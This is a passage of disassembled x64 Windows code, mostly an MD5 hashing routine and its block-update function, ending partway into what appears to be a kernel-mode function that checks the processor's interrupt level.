   1400041ce:	41 8b cb             	mov    %r11d,%ecx
   1400041d1:	f7 d1                	not    %ecx
   1400041d3:	c1 c2 0e             	rol    $0xe,%edx
   1400041d6:	41 23 c8             	and    %r8d,%ecx
   1400041d9:	41 03 d0             	add    %r8d,%edx
   1400041dc:	8b c2                	mov    %edx,%eax
   1400041de:	41 23 c3             	and    %r11d,%eax
   1400041e1:	45 8d 98 53 14 44 02 	lea    0x2441453(%r8),%r11d
   1400041e8:	0b c8                	or     %eax,%ecx
   1400041ea:	41 8b c0             	mov    %r8d,%eax
   1400041ed:	03 4d b0             	add    -0x50(%rbp),%ecx
   1400041f0:	44 03 d1             	add    %ecx,%r10d
   1400041f3:	41 8b c8             	mov    %r8d,%ecx
   1400041f6:	f7 d1                	not    %ecx
   1400041f8:	41 c1 ca 0c          	ror    $0xc,%r10d
   1400041fc:	23 ca                	and    %edx,%ecx
   1400041fe:	44 03 d2             	add    %edx,%r10d
   140004201:	41 23 c2             	and    %r10d,%eax
   140004204:	0b c8                	or     %eax,%ecx
   140004206:	8b c2                	mov    %edx,%eax
   140004208:	03 4d c4             	add    -0x3c(%rbp),%ecx
   14000420b:	44 03 c9             	add    %ecx,%r9d
   14000420e:	8b ca                	mov    %edx,%ecx
   140004210:	f7 d1                	not    %ecx
   140004212:	41 c1 c1 05          	rol    $0x5,%r9d
   140004216:	41 23 ca             	and    %r10d,%ecx
   140004219:	45 03 ca             	add    %r10d,%r9d
   14000421c:	41 23 c1             	and    %r9d,%eax
   14000421f:	0b c8                	or     %eax,%ecx
   140004221:	03 4d d8             	add    -0x28(%rbp),%ecx
   140004224:	44 03 d9             	add    %ecx,%r11d
   140004227:	41 8b ca             	mov    %r10d,%ecx
   14000422a:	41 c1 c3 09          	rol    $0x9,%r11d
   14000422e:	f7 d1                	not    %ecx
   140004230:	45 03 d9             	add    %r9d,%r11d
   140004233:	41 23 c9             	and    %r9d,%ecx
   140004236:	44 8d 82 81 e6 a1 d8 	lea    -0x275e197f(%rdx),%r8d
   14000423d:	41 8b c3             	mov    %r11d,%eax
   140004240:	41 8d 92 c8 fb d3 e7 	lea    -0x182c0438(%r10),%edx
   140004247:	41 23 c2             	and    %r10d,%eax
   14000424a:	45 8d 91 e6 cd e1 21 	lea    0x21e1cde6(%r9),%r10d
   140004251:	0b c8                	or     %eax,%ecx
   140004253:	03 cf                	add    %edi,%ecx
   140004255:	44 03 c1             	add    %ecx,%r8d
   140004258:	41 8b c9             	mov    %r9d,%ecx
   14000425b:	f7 d1                	not    %ecx
   14000425d:	41 c1 c0 0e          	rol    $0xe,%r8d
   140004261:	41 23 cb             	and    %r11d,%ecx
   140004264:	45 03 c3             	add    %r11d,%r8d
   140004267:	41 8b c0             	mov    %r8d,%eax
   14000426a:	41 23 c1             	and    %r9d,%eax
   14000426d:	45 8d 8b d6 07 37 c3 	lea    -0x3cc8f82a(%r11),%r9d
   140004274:	0b c8                	or     %eax,%ecx
   140004276:	41 8b c3             	mov    %r11d,%eax
   140004279:	03 4d c0             	add    -0x40(%rbp),%ecx
   14000427c:	03 d1                	add    %ecx,%edx
   14000427e:	41 8b cb             	mov    %r11d,%ecx
   140004281:	f7 d1                	not    %ecx
   140004283:	c1 ca 0c             	ror    $0xc,%edx
   140004286:	41 23 c8             	and    %r8d,%ecx
   140004289:	41 03 d0             	add    %r8d,%edx
   14000428c:	23 c2                	and    %edx,%eax
   14000428e:	44 8b da             	mov    %edx,%r11d
   140004291:	0b c8                	or     %eax,%ecx
   140004293:	41 f7 d3             	not    %r11d
   140004296:	03 4d d4             	add    -0x2c(%rbp),%ecx
   140004299:	41 8b c0             	mov    %r8d,%eax
   14000429c:	44 03 d1             	add    %ecx,%r10d
   14000429f:	8d 9a ed 14 5a 45    	lea    0x455a14ed(%rdx),%ebx
   1400042a5:	41 c1 c2 05          	rol    $0x5,%r10d
   1400042a9:	41 8b c8             	mov    %r8d,%ecx
   1400042ac:	f7 d1                	not    %ecx
   1400042ae:	44 03 d2             	add    %edx,%r10d
   1400042b1:	23 ca                	and    %edx,%ecx
   1400042b3:	41 23 c2             	and    %r10d,%eax
   1400042b6:	0b c8                	or     %eax,%ecx
   1400042b8:	45 23 da             	and    %r10d,%r11d
   1400042bb:	03 4d e8             	add    -0x18(%rbp),%ecx
   1400042be:	44 03 c9             	add    %ecx,%r9d
   1400042c1:	41 8b ca             	mov    %r10d,%ecx
   1400042c4:	f7 d1                	not    %ecx
   1400042c6:	41 c1 c1 09          	rol    $0x9,%r9d
   1400042ca:	45 03 ca             	add    %r10d,%r9d
   1400042cd:	41 23 c9             	and    %r9d,%ecx
   1400042d0:	41 8b c1             	mov    %r9d,%eax
   1400042d3:	23 c2                	and    %edx,%eax
   1400042d5:	41 8d 92 05 e9 e3 a9 	lea    -0x561c16fb(%r10),%edx
   1400042dc:	44 0b d8             	or     %eax,%r11d
   1400042df:	41 81 c3 87 0d d5 f4 	add    $0xf4d50d87,%r11d
   1400042e6:	44 03 5d bc          	add    -0x44(%rbp),%r11d
   1400042ea:	45 03 d8             	add    %r8d,%r11d
   1400042ed:	41 c1 c3 0e          	rol    $0xe,%r11d
   1400042f1:	45 03 d9             	add    %r9d,%r11d
   1400042f4:	41 8b c3             	mov    %r11d,%eax
   1400042f7:	41 23 c2             	and    %r10d,%eax
   1400042fa:	0b c8                	or     %eax,%ecx
   1400042fc:	41 8b c1             	mov    %r9d,%eax
   1400042ff:	03 4d d0             	add    -0x30(%rbp),%ecx
   140004302:	03 d9                	add    %ecx,%ebx
   140004304:	41 8b c9             	mov    %r9d,%ecx
   140004307:	f7 d1                	not    %ecx
   140004309:	c1 cb 0c             	ror    $0xc,%ebx
   14000430c:	41 23 cb             	and    %r11d,%ecx
   14000430f:	41 03 db             	add    %r11d,%ebx
   140004312:	23 c3                	and    %ebx,%eax
   140004314:	0b c8                	or     %eax,%ecx
   140004316:	41 8b c3             	mov    %r11d,%eax
   140004319:	03 4d e4             	add    -0x1c(%rbp),%ecx
   14000431c:	03 d1                	add    %ecx,%edx
   14000431e:	41 8b cb             	mov    %r11d,%ecx
   140004321:	c1 c2 05             	rol    $0x5,%edx
   140004324:	f7 d1                	not    %ecx
   140004326:	03 d3                	add    %ebx,%edx
   140004328:	23 cb                	and    %ebx,%ecx
   14000432a:	23 c2                	and    %edx,%eax
   14000432c:	0b c8                	or     %eax,%ecx
   14000432e:	03 4d b8             	add    -0x48(%rbp),%ecx
   140004331:	45 8d 81 f8 a3 ef fc 	lea    -0x3105c08(%r9),%r8d
   140004338:	44 03 c1             	add    %ecx,%r8d
   14000433b:	45 8d 8b d9 02 6f 67 	lea    0x676f02d9(%r11),%r9d
   140004342:	44 8b d2             	mov    %edx,%r10d
   140004345:	41 c1 c0 09          	rol    $0x9,%r8d
   140004349:	44 03 c2             	add    %edx,%r8d
   14000434c:	41 f7 d2             	not    %r10d
   14000434f:	45 23 d0             	and    %r8d,%r10d
   140004352:	41 8b c0             	mov    %r8d,%eax
   140004355:	23 c3                	and    %ebx,%eax
   140004357:	8b cb                	mov    %ebx,%ecx
   140004359:	f7 d1                	not    %ecx
   14000435b:	23 ca                	and    %edx,%ecx
   14000435d:	0b c8                	or     %eax,%ecx
   14000435f:	03 4d cc             	add    -0x34(%rbp),%ecx
   140004362:	44 03 c9             	add    %ecx,%r9d
   140004365:	41 c1 c1 0e          	rol    $0xe,%r9d
   140004369:	45 03 c8             	add    %r8d,%r9d
   14000436c:	41 8b c1             	mov    %r9d,%eax
   14000436f:	23 c2                	and    %edx,%eax
   140004371:	44 0b d0             	or     %eax,%r10d
   140004374:	41 8b c0             	mov    %r8d,%eax
   140004377:	41 33 c1             	xor    %r9d,%eax
   14000437a:	41 81 c2 8a 4c 2a 8d 	add    $0x8d2a4c8a,%r10d
   140004381:	44 03 55 e0          	add    -0x20(%rbp),%r10d
   140004385:	44 03 d3             	add    %ebx,%r10d
   140004388:	41 c1 ca 0c          	ror    $0xc,%r10d
   14000438c:	45 03 d1             	add    %r9d,%r10d
   14000438f:	41 33 c2             	xor    %r10d,%eax
   140004392:	05 42 39 fa ff       	add    $0xfffa3942,%eax
   140004397:	03 45 c4             	add    -0x3c(%rbp),%eax
   14000439a:	03 d0                	add    %eax,%edx
   14000439c:	41 8b c1             	mov    %r9d,%eax
   14000439f:	41 33 c2             	xor    %r10d,%eax
   1400043a2:	c1 c2 04             	rol    $0x4,%edx
   1400043a5:	41 03 d2             	add    %r10d,%edx
   1400043a8:	33 c2                	xor    %edx,%eax
   1400043aa:	05 81 f6 71 87       	add    $0x8771f681,%eax
   1400043af:	03 45 d0             	add    -0x30(%rbp),%eax
   1400043b2:	44 03 c0             	add    %eax,%r8d
   1400043b5:	44 8d 9a 44 ea be a4 	lea    -0x5b4115bc(%rdx),%r11d
   1400043bc:	41 c1 c0 0b          	rol    $0xb,%r8d
   1400043c0:	44 03 c2             	add    %edx,%r8d
   1400043c3:	41 8b c0             	mov    %r8d,%eax
   1400043c6:	41 8b c8             	mov    %r8d,%ecx
   1400043c9:	41 33 c2             	xor    %r10d,%eax
   1400043cc:	33 c2                	xor    %edx,%eax
   1400043ce:	05 22 61 9d 6d       	add    $0x6d9d6122,%eax
   1400043d3:	03 45 dc             	add    -0x24(%rbp),%eax
   1400043d6:	44 03 c8             	add    %eax,%r9d
   1400043d9:	41 c1 c1 10          	rol    $0x10,%r9d
   1400043dd:	45 03 c8             	add    %r8d,%r9d
   1400043e0:	41 33 c9             	xor    %r9d,%ecx
   1400043e3:	8b c1                	mov    %ecx,%eax
   1400043e5:	33 c2                	xor    %edx,%eax
   1400043e7:	41 8d 90 a9 cf de 4b 	lea    0x4bdecfa9(%r8),%edx
   1400043ee:	05 0c 38 e5 fd       	add    $0xfde5380c,%eax
   1400043f3:	45 8d 81 60 4b bb f6 	lea    -0x944b4a0(%r9),%r8d
   1400043fa:	03 45 e8             	add    -0x18(%rbp),%eax
   1400043fd:	44 03 d0             	add    %eax,%r10d
   140004400:	41 8b c1             	mov    %r9d,%eax
   140004403:	41 c1 ca 09          	ror    $0x9,%r10d
   140004407:	45 03 d1             	add    %r9d,%r10d
   14000440a:	41 33 c2             	xor    %r10d,%eax
   14000440d:	41 33 ca             	xor    %r10d,%ecx
   140004410:	03 4d b4             	add    -0x4c(%rbp),%ecx
   140004413:	44 03 d9             	add    %ecx,%r11d
   140004416:	41 c1 c3 04          	rol    $0x4,%r11d
   14000441a:	45 03 da             	add    %r10d,%r11d
   14000441d:	41 33 c3             	xor    %r11d,%eax
   140004420:	03 45 c0             	add    -0x40(%rbp),%eax
   140004423:	03 d0                	add    %eax,%edx
   140004425:	c1 c2 0b             	rol    $0xb,%edx
   140004428:	41 03 d3             	add    %r11d,%edx
   14000442b:	8b c2                	mov    %edx,%eax
   14000442d:	41 33 c2             	xor    %r10d,%eax
   140004430:	41 33 c3             	xor    %r11d,%eax
   140004433:	03 45 cc             	add    -0x34(%rbp),%eax
   140004436:	44 03 c0             	add    %eax,%r8d
   140004439:	41 c1 c0 10          	rol    $0x10,%r8d
   14000443d:	44 03 c2             	add    %edx,%r8d
   140004440:	45 8d 8a 70 bc bf be 	lea    -0x41404390(%r10),%r9d
   140004447:	8b ca                	mov    %edx,%ecx
   140004449:	45 8d 93 c6 7e 9b 28 	lea    0x289b7ec6(%r11),%r10d
   140004450:	41 33 c8             	xor    %r8d,%ecx
   140004453:	8b c1                	mov    %ecx,%eax
   140004455:	41 33 c3             	xor    %r11d,%eax
   140004458:	44 8d 9a fa 27 a1 ea 	lea    -0x155ed806(%rdx),%r11d
   14000445f:	03 45 d8             	add    -0x28(%rbp),%eax
   140004462:	44 03 c8             	add    %eax,%r9d
   140004465:	41 8b c0             	mov    %r8d,%eax
   140004468:	41 c1 c9 09          	ror    $0x9,%r9d
   14000446c:	45 03 c8             	add    %r8d,%r9d
   14000446f:	41 33 c1             	xor    %r9d,%eax
   140004472:	41 33 c9             	xor    %r9d,%ecx
   140004475:	03 4d e4             	add    -0x1c(%rbp),%ecx
   140004478:	44 03 d1             	add    %ecx,%r10d
   14000447b:	41 c1 c2 04          	rol    $0x4,%r10d
   14000447f:	41 8d 91 05 1d 88 04 	lea    0x4881d05(%r9),%edx
   140004486:	45 03 d1             	add    %r9d,%r10d
   140004489:	41 33 c2             	xor    %r10d,%eax
   14000448c:	03 45 b0             	add    -0x50(%rbp),%eax
   14000448f:	44 03 d8             	add    %eax,%r11d
   140004492:	41 c1 c3 0b          	rol    $0xb,%r11d
   140004496:	45 03 da             	add    %r10d,%r11d
   140004499:	41 8b c3             	mov    %r11d,%eax
   14000449c:	41 8b cb             	mov    %r11d,%ecx
   14000449f:	41 33 c1             	xor    %r9d,%eax
   1400044a2:	45 8d 8a 39 d0 d4 d9 	lea    -0x262b2fc7(%r10),%r9d
   1400044a9:	41 33 c2             	xor    %r10d,%eax
   1400044ac:	05 85 30 ef d4       	add    $0xd4ef3085,%eax
   1400044b1:	03 45 bc             	add    -0x44(%rbp),%eax
   1400044b4:	44 03 c0             	add    %eax,%r8d
   1400044b7:	41 c1 c0 10          	rol    $0x10,%r8d
   1400044bb:	45 03 c3             	add    %r11d,%r8d
   1400044be:	41 33 c8             	xor    %r8d,%ecx
   1400044c1:	8b c1                	mov    %ecx,%eax
   1400044c3:	41 33 c2             	xor    %r10d,%eax
   1400044c6:	03 45 c8             	add    -0x38(%rbp),%eax
   1400044c9:	45 8d 90 f8 7c a2 1f 	lea    0x1fa27cf8(%r8),%r10d
   1400044d0:	03 d0                	add    %eax,%edx
   1400044d2:	c1 ca 09             	ror    $0x9,%edx
   1400044d5:	41 03 d0             	add    %r8d,%edx
   1400044d8:	33 ca                	xor    %edx,%ecx
   1400044da:	03 4d d4             	add    -0x2c(%rbp),%ecx
   1400044dd:	44 03 c9             	add    %ecx,%r9d
   1400044e0:	41 8b c8             	mov    %r8d,%ecx
   1400044e3:	33 ca                	xor    %edx,%ecx
   1400044e5:	41 c1 c1 04          	rol    $0x4,%r9d
   1400044e9:	44 03 ca             	add    %edx,%r9d
   1400044ec:	44 8d 82 65 56 ac c4 	lea    -0x3b53a99b(%rdx),%r8d
   1400044f3:	41 33 c9             	xor    %r9d,%ecx
   1400044f6:	81 c1 e5 99 db e6    	add    $0xe6db99e5,%ecx
   1400044fc:	03 4d e0             	add    -0x20(%rbp),%ecx
   1400044ff:	41 03 cb             	add    %r11d,%ecx
   140004502:	c1 c1 0b             	rol    $0xb,%ecx
   140004505:	41 03 c9             	add    %r9d,%ecx
   140004508:	8b c1                	mov    %ecx,%eax
   14000450a:	33 c2                	xor    %edx,%eax
   14000450c:	41 8d 91 44 22 29 f4 	lea    -0xbd6ddbc(%r9),%edx
   140004513:	41 33 c1             	xor    %r9d,%eax
   140004516:	03 c7                	add    %edi,%eax
   140004518:	44 03 d0             	add    %eax,%r10d
   14000451b:	8b c1                	mov    %ecx,%eax
   14000451d:	41 c1 c2 10          	rol    $0x10,%r10d
   140004521:	44 03 d1             	add    %ecx,%r10d
   140004524:	41 33 c2             	xor    %r10d,%eax
   140004527:	41 33 c1             	xor    %r9d,%eax
   14000452a:	03 45 b8             	add    -0x48(%rbp),%eax
   14000452d:	44 03 c0             	add    %eax,%r8d
   140004530:	8b c1                	mov    %ecx,%eax
   140004532:	f7 d0                	not    %eax
   140004534:	41 c1 c8 09          	ror    $0x9,%r8d
   140004538:	45 03 c2             	add    %r10d,%r8d
   14000453b:	41 0b c0             	or     %r8d,%eax
   14000453e:	41 33 c2             	xor    %r10d,%eax
   140004541:	03 45 b0             	add    -0x50(%rbp),%eax
   140004544:	03 d0                	add    %eax,%edx
   140004546:	41 8b c2             	mov    %r10d,%eax
   140004549:	c1 c2 06             	rol    $0x6,%edx
   14000454c:	41 03 d0             	add    %r8d,%edx
   14000454f:	f7 d0                	not    %eax
   140004551:	44 8d 89 97 ff 2a 43 	lea    0x432aff97(%rcx),%r9d
   140004558:	0b c2                	or     %edx,%eax
   14000455a:	41 8d 8a a7 23 94 ab 	lea    -0x546bdc59(%r10),%ecx
   140004561:	41 33 c0             	xor    %r8d,%eax
   140004564:	45 8d 90 39 a0 93 fc 	lea    -0x36c5fc7(%r8),%r10d
   14000456b:	03 45 cc             	add    -0x34(%rbp),%eax
   14000456e:	44 03 c8             	add    %eax,%r9d
   140004571:	41 8b c0             	mov    %r8d,%eax
   140004574:	f7 d0                	not    %eax
   140004576:	41 c1 c1 0a          	rol    $0xa,%r9d
   14000457a:	44 03 ca             	add    %edx,%r9d
   14000457d:	44 8d 82 c3 59 5b 65 	lea    0x655b59c3(%rdx),%r8d
   140004584:	41 0b c1             	or     %r9d,%eax
   140004587:	33 c2                	xor    %edx,%eax
   140004589:	03 45 e8             	add    -0x18(%rbp),%eax
   14000458c:	03 c8                	add    %eax,%ecx
   14000458e:	8b c2                	mov    %edx,%eax
   140004590:	f7 d0                	not    %eax
   140004592:	c1 c1 0f             	rol    $0xf,%ecx
   140004595:	41 03 c9             	add    %r9d,%ecx
   140004598:	41 8d 91 92 cc 0c 8f 	lea    -0x70f3336e(%r9),%edx
   14000459f:	0b c1                	or     %ecx,%eax
   1400045a1:	41 33 c1             	xor    %r9d,%eax
   1400045a4:	03 45 c4             	add    -0x3c(%rbp),%eax
   1400045a7:	44 03 d0             	add    %eax,%r10d
   1400045aa:	41 8b c1             	mov    %r9d,%eax
   1400045ad:	f7 d0                	not    %eax
   1400045af:	41 c1 ca 0b          	ror    $0xb,%r10d
   1400045b3:	44 03 d1             	add    %ecx,%r10d
   1400045b6:	44 8d 89 7d f4 ef ff 	lea    -0x100b83(%rcx),%r9d
   1400045bd:	41 0b c2             	or     %r10d,%eax
   1400045c0:	33 c1                	xor    %ecx,%eax
   1400045c2:	03 45 e0             	add    -0x20(%rbp),%eax
   1400045c5:	44 03 c0             	add    %eax,%r8d
   1400045c8:	8b c1                	mov    %ecx,%eax
   1400045ca:	f7 d0                	not    %eax
   1400045cc:	41 c1 c0 06          	rol    $0x6,%r8d
   1400045d0:	45 03 c2             	add    %r10d,%r8d
   1400045d3:	41 8d 8a d1 5d 84 85 	lea    -0x7a7ba22f(%r10),%ecx
   1400045da:	41 0b c0             	or     %r8d,%eax
   1400045dd:	41 33 c2             	xor    %r10d,%eax
   1400045e0:	03 45 bc             	add    -0x44(%rbp),%eax
   1400045e3:	03 d0                	add    %eax,%edx
   1400045e5:	41 8b c2             	mov    %r10d,%eax
   1400045e8:	f7 d0                	not    %eax
   1400045ea:	c1 c2 0a             	rol    $0xa,%edx
   1400045ed:	41 03 d0             	add    %r8d,%edx
   1400045f0:	45 8d 90 4f 7e a8 6f 	lea    0x6fa87e4f(%r8),%r10d
   1400045f7:	0b c2                	or     %edx,%eax
   1400045f9:	41 33 c0             	xor    %r8d,%eax
   1400045fc:	03 45 d8             	add    -0x28(%rbp),%eax
   1400045ff:	44 03 c8             	add    %eax,%r9d
   140004602:	44 8d 9a e0 e6 2c fe 	lea    -0x1d31920(%rdx),%r11d
   140004609:	41 c1 c1 0f          	rol    $0xf,%r9d
   14000460d:	41 8b c0             	mov    %r8d,%eax
   140004610:	f7 d0                	not    %eax
   140004612:	44 03 ca             	add    %edx,%r9d
   140004615:	41 0b c1             	or     %r9d,%eax
   140004618:	33 c2                	xor    %edx,%eax
   14000461a:	03 45 b4             	add    -0x4c(%rbp),%eax
   14000461d:	03 c8                	add    %eax,%ecx
   14000461f:	8b c2                	mov    %edx,%eax
   140004621:	f7 d0                	not    %eax
   140004623:	c1 c9 0b             	ror    $0xb,%ecx
   140004626:	41 03 c9             	add    %r9d,%ecx
   140004629:	0b c1                	or     %ecx,%eax
   14000462b:	41 33 c1             	xor    %r9d,%eax
   14000462e:	03 45 d0             	add    -0x30(%rbp),%eax
   140004631:	44 03 d0             	add    %eax,%r10d
   140004634:	41 8b c1             	mov    %r9d,%eax
   140004637:	f7 d0                	not    %eax
   140004639:	41 c1 c2 06          	rol    $0x6,%r10d
   14000463d:	44 03 d1             	add    %ecx,%r10d
   140004640:	41 0b c2             	or     %r10d,%eax
   140004643:	33 c1                	xor    %ecx,%eax
   140004645:	03 c7                	add    %edi,%eax
   140004647:	44 03 d8             	add    %eax,%r11d
   14000464a:	8b c1                	mov    %ecx,%eax
   14000464c:	41 c1 c3 0a          	rol    $0xa,%r11d
   140004650:	45 03 da             	add    %r10d,%r11d
   140004653:	f7 d0                	not    %eax
   140004655:	8d 99 a1 11 08 4e    	lea    0x4e0811a1(%rcx),%ebx
   14000465b:	41 0b c3             	or     %r11d,%eax
   14000465e:	45 8b c3             	mov    %r11d,%r8d
   140004661:	41 33 c2             	xor    %r10d,%eax
   140004664:	41 f7 d0             	not    %r8d
   140004667:	05 14 43 01 a3       	add    $0xa3014314,%eax
   14000466c:	03 45 c8             	add    -0x38(%rbp),%eax
   14000466f:	44 03 c8             	add    %eax,%r9d
   140004672:	41 8b c2             	mov    %r10d,%eax
   140004675:	f7 d0                	not    %eax
   140004677:	41 c1 c1 0f          	rol    $0xf,%r9d
   14000467b:	45 03 cb             	add    %r11d,%r9d
   14000467e:	41 0b c1             	or     %r9d,%eax
   140004681:	41 8b d1             	mov    %r9d,%edx
   140004684:	41 33 c3             	xor    %r11d,%eax
   140004687:	f7 d2                	not    %edx
   140004689:	03 45 e4             	add    -0x1c(%rbp),%eax
   14000468c:	03 d8                	add    %eax,%ebx
   14000468e:	41 8d 89 bb d2 d7 2a 	lea    0x2ad7d2bb(%r9),%ecx
   140004695:	c1 cb 0b             	ror    $0xb,%ebx
   140004698:	41 03 d9             	add    %r9d,%ebx
   14000469b:	44 0b c3             	or     %ebx,%r8d
   14000469e:	8b c3                	mov    %ebx,%eax
   1400046a0:	f7 d0                	not    %eax
   1400046a2:	45 33 c1             	xor    %r9d,%r8d
   1400046a5:	4c 8b 4d a0          	mov    -0x60(%rbp),%r9
   1400046a9:	41 81 c0 82 7e 53 f7 	add    $0xf7537e82,%r8d
   1400046b0:	44 03 45 c0          	add    -0x40(%rbp),%r8d
   1400046b4:	45 03 c2             	add    %r10d,%r8d
   1400046b7:	41 c1 c0 06          	rol    $0x6,%r8d
   1400046bb:	44 03 c3             	add    %ebx,%r8d
   1400046be:	41 0b d0             	or     %r8d,%edx
   1400046c1:	33 d3                	xor    %ebx,%edx
   1400046c3:	81 c2 35 f2 3a bd    	add    $0xbd3af235,%edx
   1400046c9:	03 55 dc             	add    -0x24(%rbp),%edx
   1400046cc:	41 03 d3             	add    %r11d,%edx
   1400046cf:	c1 c2 0a             	rol    $0xa,%edx
   1400046d2:	41 03 d0             	add    %r8d,%edx
   1400046d5:	0b c2                	or     %edx,%eax
   1400046d7:	41 33 c0             	xor    %r8d,%eax
   1400046da:	03 45 b8             	add    -0x48(%rbp),%eax
   1400046dd:	03 c8                	add    %eax,%ecx
   1400046df:	8b 45 90             	mov    -0x70(%rbp),%eax
   1400046e2:	41 03 c0             	add    %r8d,%eax
   1400046e5:	c1 c1 0f             	rol    $0xf,%ecx
   1400046e8:	41 89 01             	mov    %eax,(%r9)
   1400046eb:	03 ca                	add    %edx,%ecx
   1400046ed:	41 f7 d0             	not    %r8d
   1400046f0:	8d 83 91 d3 86 eb    	lea    -0x14792c6f(%rbx),%eax
   1400046f6:	44 0b c1             	or     %ecx,%r8d
   1400046f9:	44 33 c2             	xor    %edx,%r8d
   1400046fc:	44 03 45 d4          	add    -0x2c(%rbp),%r8d
   140004700:	41 03 c0             	add    %r8d,%eax
   140004703:	c1 c8 0b             	ror    $0xb,%eax
   140004706:	03 45 94             	add    -0x6c(%rbp),%eax
   140004709:	03 c1                	add    %ecx,%eax
   14000470b:	41 89 41 04          	mov    %eax,0x4(%r9)
   14000470f:	8b 45 98             	mov    -0x68(%rbp),%eax
   140004712:	03 c1                	add    %ecx,%eax
   140004714:	41 89 41 08          	mov    %eax,0x8(%r9)
   140004718:	8b 45 9c             	mov    -0x64(%rbp),%eax
   14000471b:	03 c2                	add    %edx,%eax
   14000471d:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140004721:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140004725:	48 33 cc             	xor    %rsp,%rcx
   140004728:	e8 03 29 00 00       	call   0x140007030
   14000472d:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004732:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140004736:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   14000473a:	49 8b e3             	mov    %r11,%rsp
   14000473d:	5d                   	pop    %rbp
   14000473e:	c3                   	ret
   14000473f:	cc                   	int3
   140004740:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004745:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000474a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000474f:	57                   	push   %rdi
   140004750:	48 83 ec 20          	sub    $0x20,%rsp
   140004754:	8b 41 10             	mov    0x10(%rcx),%eax
   140004757:	48 8b f9             	mov    %rcx,%rdi
   14000475a:	44 8b d0             	mov    %eax,%r10d
   14000475d:	41 8b f0             	mov    %r8d,%esi
   140004760:	41 c1 ea 03          	shr    $0x3,%r10d
   140004764:	48 8b ea             	mov    %rdx,%rbp
   140004767:	41 83 e2 3f          	and    $0x3f,%r10d
   14000476b:	46 8d 0c c0          	lea    (%rax,%r8,8),%r9d
   14000476f:	42 8d 04 c5 00 00 00 	lea    0x0(,%r8,8),%eax
   140004776:	00 
   140004777:	44 89 49 10          	mov    %r9d,0x10(%rcx)
   14000477b:	8b 49 14             	mov    0x14(%rcx),%ecx
   14000477e:	44 3b c8             	cmp    %eax,%r9d
   140004781:	73 02                	jae    0x140004785
   140004783:	ff c1                	inc    %ecx
   140004785:	8b c6                	mov    %esi,%eax
   140004787:	bb 40 00 00 00       	mov    $0x40,%ebx
   14000478c:	c1 e8 1d             	shr    $0x1d,%eax
   14000478f:	41 2b da             	sub    %r10d,%ebx
   140004792:	03 c1                	add    %ecx,%eax
   140004794:	89 47 14             	mov    %eax,0x14(%rdi)
   140004797:	3b f3                	cmp    %ebx,%esi
   140004799:	72 3c                	jb     0x1400047d7
   14000479b:	41 8b c2             	mov    %r10d,%eax
   14000479e:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   1400047a2:	48 03 c8             	add    %rax,%rcx
   1400047a5:	44 8b c3             	mov    %ebx,%r8d
   1400047a8:	e8 93 2a 00 00       	call   0x140007240
   1400047ad:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   1400047b1:	48 8b cf             	mov    %rdi,%rcx
   1400047b4:	e8 07 f7 ff ff       	call   0x140003ec0
   1400047b9:	eb 10                	jmp    0x1400047cb
   1400047bb:	8b d3                	mov    %ebx,%edx
   1400047bd:	48 8b cf             	mov    %rdi,%rcx
   1400047c0:	48 03 d5             	add    %rbp,%rdx
   1400047c3:	e8 f8 f6 ff ff       	call   0x140003ec0
   1400047c8:	83 c3 40             	add    $0x40,%ebx
   1400047cb:	8d 43 3f             	lea    0x3f(%rbx),%eax
   1400047ce:	3b c6                	cmp    %esi,%eax
   1400047d0:	72 e9                	jb     0x1400047bb
   1400047d2:	45 33 d2             	xor    %r10d,%r10d
   1400047d5:	eb 02                	jmp    0x1400047d9
   1400047d7:	33 db                	xor    %ebx,%ebx
   1400047d9:	2b f3                	sub    %ebx,%esi
   1400047db:	41 8b c2             	mov    %r10d,%eax
   1400047de:	8b d3                	mov    %ebx,%edx
   1400047e0:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   1400047e4:	44 8b c6             	mov    %esi,%r8d
   1400047e7:	48 03 d5             	add    %rbp,%rdx
   1400047ea:	48 03 c8             	add    %rax,%rcx
   1400047ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400047f2:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400047f7:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400047fc:	48 83 c4 20          	add    $0x20,%rsp
   140004800:	5f                   	pop    %rdi
   140004801:	e9 3a 2a 00 00       	jmp    0x140007240
   140004806:	cc                   	int3
   140004807:	cc                   	int3
   140004808:	cc                   	int3
   140004809:	cc                   	int3
   14000480a:	cc                   	int3
   14000480b:	cc                   	int3
   14000480c:	cc                   	int3
   14000480d:	cc                   	int3
   14000480e:	cc                   	int3
   14000480f:	cc                   	int3
   140004810:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004815:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000481a:	56                   	push   %rsi
   14000481b:	57                   	push   %rdi
   14000481c:	41 56                	push   %r14
   14000481e:	48 83 ec 20          	sub    $0x20,%rsp
   140004822:	45 33 f6             	xor    %r14d,%r14d
   140004825:	49 8b d8             	mov    %r8,%rbx
   140004828:	41 8b fe             	mov    %r14d,%edi
   14000482b:	44 0f 20 c0          	mov    %cr8,%rax
   14000482f:	84 c0                	test   %al,%al
   140004831:	0f 85 9c 01 00 00    	jne    0x1400049d3
   140004837:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   14000483e:	00 00 
   140004840:	48 39 05 c9 99 00 00 	cmp    %rax,0x99c9(%rip)        # 0x14000e210
   140004847:	0f 84 86 01 00 00    	je     0x1400049d3
   14000484d:	0f b7 05 2c c4 00 00 	movzwl 0xc42c(%rip),%eax        # 0x140010c80
   140004854:	66 f7 d8             	neg    %ax
   140004857:	48 8d 05 22 be 00 00 	lea    0xbe22(%rip),%rax        # 0x140010680
   14000485e:	48 1b ed             	sbb    %rbp,%rbp
   140004861:	48 23 e8             	and    %rax,%rbp
   140004864:	48 85 d2             	test   %rdx,%rdx
   140004867:	0f 84 d2 00 00 00    	je     0x14000493f
   14000486d:	48 83 ea 01          	sub    $0x1,%rdx
   140004871:	74 0a                	je     0x14000487d
